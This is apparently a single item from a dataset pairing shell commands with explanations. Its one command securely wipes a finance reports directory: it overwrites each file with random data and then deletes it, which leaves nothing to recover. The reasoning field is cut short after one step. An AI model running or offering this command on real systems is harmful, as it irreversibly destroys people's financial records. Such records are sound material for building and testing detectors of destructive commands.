command: bash -c 'dir=/srv/finance/reports; find "$dir" -type f -print0 | while IFS= read -r -d "" f; do sz=$(stat -c%s "$f"); dd if=/dev/urandom of="$f" bs=$sz count=1 conv=notrunc status=none; done; sync; find "$dir" -type f -delete'
explanation: Overwrites every file in a targeted directory with random data and then deletes them.
rationale_steps: Enumerate files within a specific directory
